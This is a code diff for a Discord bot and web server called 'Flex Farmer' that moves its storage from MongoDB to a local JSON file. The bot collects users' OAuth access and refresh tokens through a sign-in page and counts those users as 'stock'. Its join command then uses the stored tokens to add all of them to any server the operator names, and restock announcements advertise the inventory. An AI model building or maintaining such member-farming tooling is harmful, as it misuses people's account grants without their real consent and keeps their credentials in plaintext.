@@ -13,8 +13,9 @@ const {
     MessageType
 } = require('discord.js');
 const express = require('express');
-const fetch = require('node-fetch');
-const mongoose = require('mongoose');
+const fs = require('fs');
+const path = require('path');
+const https = require('https');
 require('dotenv').config();
 
 const app = express();
@@ -22,6 +23,45 @@ const PORT = process.env.PORT || 8080;
 
 const DEFAULT_PREFIX = ','; 
 let currentPrefix = DEFAULT_PREFIX;
+
+// --- Built-in File Persistence Setup ---
+const DB_FILE = path.join(__dirname, 'database.json');
+
+function readDB() {
+    try {
+        if (!fs.existsSync(DB_FILE)) {
+            fs.writeFileSync(DB_FILE, JSON.stringify({ users: {}, restockCounter: 0, allTimeAuthCount: 0 }, null, 2));
+        }
+        return JSON.parse(fs.readFileSync(DB_FILE, 'utf8'));
+    } catch (e) {
+        return { users: {}, restockCounter: 0, allTimeAuthCount: 0 };
+    }
+}
+
+function writeDB(data) {
+    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
+}
+
+// --- Built-in HTTPS Request Helper ---
+function makeHttpsRequest(url, options = {}, bodyData = null) {
+    return new Promise((resolve, reject) => {
+        const req = https.request(url, options, (res) => {
+            let body = '';
+            res.on('data', chunk => body += chunk);
+            res.on('end', () => {
+                try {
+                    const parsed = JSON.parse(body);
+                    resolve({ ok: res.statusCode >= 200 && res.statusCode < 300, status: res.statusCode, json: async () => parsed });
+                } catch (e) {
+                    resolve({ ok: res.statusCode >= 200 && res.statusCode < 300, status: res.statusCode, text: async () => body });
+                }
+            });
+        });
+        req.on('error', reject);
+        if (bodyData) req.write(bodyData);
+        req.end();
+    });
+}
 
 let discordClient = null;
 let lastBoostStickyMessage = null; 
@@ -32,39 +72,6 @@ const CHANNELS = {
     VERIFICATION_LOG: '1563253454653235261',  
     AUTO_DELETE: '1563253483824746659'        
 };
-
-// --- MongoDB Persistent Schema Setup ---
-mongoose.connect(process.env.MONGO_URI, {
-    useNewUrlParser: true,
-    useUnifiedTopology: true
-}).then(() => console.log('Connected to MongoDB Persistent Database')).catch(err => console.error('MongoDB connection error:', err));
-
-const userSchema = new mongoose.Schema({
-    user_id: { type: String, unique: true },
-    username: String,
-    avatar: String,
-    banner: String,
-    access_token: String,
-    refresh_token: String,
-    authorized_at: Number,
-    expires_at: Number
-});
-const UserModel = mongoose.model('User', userSchema);
-
-const statsSchema = new mongoose.Schema({
-    key: { type: String, unique: true },
-    restockCounter: { type: Number, default: 0 },
-    allTimeAuthCount: { type: Number, default: 0 }
-});
-const StatsModel = mongoose.model('Stat', statsSchema);
-
-async function getStats() {
-    let stats = await StatsModel.findOne({ key: 'global' });
-    if (!stats) {
-        stats = await StatsModel.create({ key: 'global', restockCounter: 0, allTimeAuthCount: 0 });
-    }
-    return stats;
-}
 
 const client = new Client({
     intents: [
@@ -97,18 +104,18 @@ app.get('/', async (req, res) => {
             grant_type: 'authorization_code',
             code: code,
             redirect_uri: process.env.REDIRECT_URI || 'https://farmerauth-production.up.railway.app',
-        });
+        }).toString();
 
-        const tokenResponse = await fetch('https://discord.com/api/oauth2/token', {
+        const tokenResponse = await makeHttpsRequest('https://discord.com/api/oauth2/token', {
             method: 'POST',
-            body: tokenParams,
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        });
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
+        }, tokenParams);
 
         const oauthData = await tokenResponse.json();
 
         if (oauthData.access_token) {
-            const userRes = await fetch('https://discord.com/api/users/@me', {
+            const userRes = await makeHttpsRequest('https://discord.com/api/users/@me', {
+                method: 'GET',
                 headers: { authorization: `Bearer ${oauthData.access_token}` }
             });
             const userData = await userRes.json();
@@ -117,27 +124,22 @@ app.get('/', async (req, res) => {
                 return res.send(`<html><body style="background:#111;color:#ff4444;text-align:center;padding-top:50px;"><h1>Error</h1><p>Failed to fetch Discord profile.</p></body></html>`);
             }
 
-            // Save or Update user in MongoDB
-            await UserModel.findOneAndUpdate(
-                { user_id: userData.id },
-                {
-                    username: userData.username,
-                    avatar: userData.avatar,
-                    banner: userData.banner,
-                    access_token: oauthData.access_token,
-                    refresh_token: oauthData.refresh_token,
-                    authorized_at: Date.now(),
-                    expires_at: Date.now() + (oauthData.expires_in * 1000)
-                },
-                { upsert: true, new: true }
-            );
+            let dbData = readDB();
+            dbData.users[userData.id] = {
+                user_id: userData.id,
+                username: userData.username,
+                avatar: userData.avatar,
+                banner: userData.banner,
+                access_token: oauthData.access_token,
+                refresh_token: oauthData.refresh_token,
+                authorized_at: Date.now(),
+                expires_at: Date.now() + (oauthData.expires_in * 1000)
+            };
+            dbData.restockCounter = (dbData.restockCounter || 0) + 1;
+            dbData.allTimeAuthCount = (dbData.allTimeAuthCount || 0) + 1;
+            writeDB(dbData);
 
-            let stats = await getStats();
-            stats.restockCounter += 1;
-            stats.allTimeAuthCount += 1;
-            await stats.save();
-
-            const totalStock = await UserModel.countDocuments();
+            const totalStock = Object.keys(dbData.users).length;
 
             if (client.isReady()) {
                 try {
@@ -170,7 +172,8 @@ app.listen(PORT, '0.0.0.0', () => console.log(`Flex Farmer Web server running on
 
 async function sendRestockAnnouncement(channel, amountAdded) {
     try {
-        const totalStock = await UserModel.countDocuments();
+        let dbData = readDB();
+        const totalStock = Object.keys(dbData.users).length;
         const restockMessage = 
             `**Restock Alert!**\n\n` +
             `**Flex Network** has restocked with **${amountAdded}**!\n\n` +
@@ -214,8 +217,8 @@ client.on('interactionCreate', async interaction => {
             try {
                 const restockChannel = client.channels.cache.get(CHANNELS.AUTORESTOCK) || await client.channels.fetch(CHANNELS.AUTORESTOCK);
                 if (restockChannel) {
-                    const stats = await getStats();
-                    await sendRestockAnnouncement(restockChannel, stats.restockCounter);
+                    let dbData = readDB();
+                    await sendRestockAnnouncement(restockChannel, dbData.restockCounter || 0);
                 }
             } catch (err) {
                 console.error('Failed to send restock announcement via button:', err);
@@ -367,31 +370,32 @@ client.on('messageCreate', async message => {
     }
 
     if (command === 'stock') {
-        const totalStock = await UserModel.countDocuments();
-        const stats = await getStats();
-        const lastRestockCount = Math.min(stats.restockCounter, totalStock);
+        const dbData = readDB();
+        const users = Object.values(dbData.users);
+        const lastRestockCount = Math.min(dbData.restockCounter || 0, users.length);
         return message.channel.send({ embeds: [new EmbedBuilder().setTitle('📦 Flex Farmer Stock').setDescription(`Available users that can join servers from the last restock: **\`${lastRestockCount}\`**`).setColor(0x595B5C)] });
     }
 
     if (command === 'auth' || command === 'authed') {
-        const users = await UserModel.find({});
+        const dbData = readDB();
+        const users = Object.values(dbData.users);
         const now = Date.now();
         const last24hCount = users.filter(user => user.authorized_at && user.authorized_at >= (now - 86400000)).length;
-        const stats = await getStats();
 
         const authEmbed = new EmbedBuilder()
             .setTitle('⚡ Authorization & Stock Statistics')
             .setColor(0x5865F2)
             .addFields(
                 { name: '🕒 Last 24 Hours', value: `\`${last24hCount}\` users authorized`, inline: true },
-                { name: '🌐 All-Time', value: `\`${stats.allTimeAuthCount}\` total authorizations`, inline: true },
+                { name: '🌐 All-Time', value: `\`${dbData.allTimeAuthCount || 0}\` total authorizations`, inline: true },
                 { name: '📦 Current Stock', value: `\`${users.length}\` active accounts`, inline: true }
             );
         return message.channel.send({ embeds: [authEmbed] });
     }
 
     if (command === 'status') {
-        const totalStock = await UserModel.countDocuments();
+        const dbData = readDB();
+        const users = Object.values(dbData.users);
         const uptimeSeconds = Math.floor(client.uptime / 1000);
         const hours = Math.floor(uptimeSeconds / 3600);
         const minutes = Math.floor((uptimeSeconds % 3600) / 60);
@@ -400,19 +404,19 @@ client.on('messageCreate', async message => {
             .setTitle('🟢 Flex Farmer Status')
             .setColor(0x00FF00)
             .addFields(
-                { name: '📊 Active Verified Stock', value: `\`${totalStock}\` accounts`, inline: true },
+                { name: '📊 Active Verified Stock', value: `\`${users.length}\` accounts`, inline: true },
                 { name: '⏱️ Uptime', value: `\`${hours}h ${minutes}m ${seconds}s\``, inline: true }
             );
         return message.channel.send({ embeds: [statusEmbed] });
     }
 
     if (command === 'restock') {
-        const totalStock = await UserModel.countDocuments();
-        const amount = parseInt(args[0]) || totalStock;
-        let stats = await getStats();
-        stats.restockCounter = amount;
-        stats.allTimeAuthCount += amount;
-        await stats.save();
+        const dbData = readDB();
+        const users = Object.values(dbData.users);
+        const amount = parseInt(args[0]) || users.length;
+        dbData.restockCounter = amount;
+        dbData.allTimeAuthCount = (dbData.allTimeAuthCount || 0) + amount;
+        writeDB(dbData);
 
         const promptEmbed = new EmbedBuilder()
             .setTitle('📦 Restock Stock Prepared')
@@ -429,11 +433,13 @@ client.on('messageCreate', async message => {
 
     if (command === 'remove') {
         const amount = parseInt(args[0]) || 1;
-        const users = await UserModel.find({}).limit(amount);
-        for (const user of users) {
-            await UserModel.deleteOne({ _id: user._id });
+        let dbData = readDB();
+        let userKeys = Object.keys(dbData.users);
+        for (let i = 0; i < Math.min(amount, userKeys.length); i++) {
+            delete dbData.users[userKeys[i]];
         }
-        const remainingStock = await UserModel.countDocuments();
+        writeDB(dbData);
+        const remainingStock = Object.keys(dbData.users).length;
         return message.channel.send(`🗑️ Removed **${amount}** accounts from stock. Current stock: \`${remainingStock}\`.`);
     }
 
@@ -441,7 +447,8 @@ client.on('messageCreate', async message => {
         const targetGuildId = args[0];
         if (!targetGuildId) return message.channel.send(`Please provide a Server ID: \`${currentPrefix}join <server_id>\``);
 
-        let tokensToUse = await UserModel.find({});
+        const dbData = readDB();
+        let tokensToUse = Object.values(dbData.users);
         if (tokensToUse.length === 0) {
             return message.channel.send({ embeds: [new EmbedBuilder().setTitle('❌ Out of Stock').setDescription(`No accounts available.`).setColor(0xFF0000)] });
         }
@@ -474,14 +481,13 @@ client.on('messageCreate', async message => {
         let successCount = 0;
         for (const tokenData of tokensToUse) {
             try {
-                const joinRes = await fetch(`https://discord.com/api/v10/guilds/${targetGuildId}/members/${tokenData.user_id}`, {
+                const joinRes = await makeHttpsRequest(`https://discord.com/api/v10/guilds/${targetGuildId}/members/${tokenData.user_id}`, {
                     method: 'PUT',
                     headers: {
                         Authorization: `Bot ${process.env.DISCORD_TOKEN}`,
                         'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({ access_token: tokenData.access_token })
-                });
+                    }
+                }, JSON.stringify({ access_token: tokenData.access_token }));
 
                 if (joinRes.ok || joinRes.status === 201 || joinRes.status === 204) {
                     successCount++;
@@ -495,7 +501,7 @@ client.on('messageCreate', async message => {
             let farmLogChannel = client.channels.cache.get(CHANNELS.FARM_LOG) || await client.channels.fetch(CHANNELS.FARM_LOG);
             if (farmLogChannel) {
                 const farmEmbed = new EmbedBuilder()
-                    .setTitle(' Farm Execution Log')
+                    .setTitle('📊 Farm Execution Log')
                     .setDescription(`**User:** <@${message.author.id}>\n**Target Server:** \`${targetGuildId}\`\n**Successfully Added:** \`${successCount}\` / \`${tokensToUse.length}\` accounts`)
                     .setColor(0x5865F2)
                     .setTimestamp();
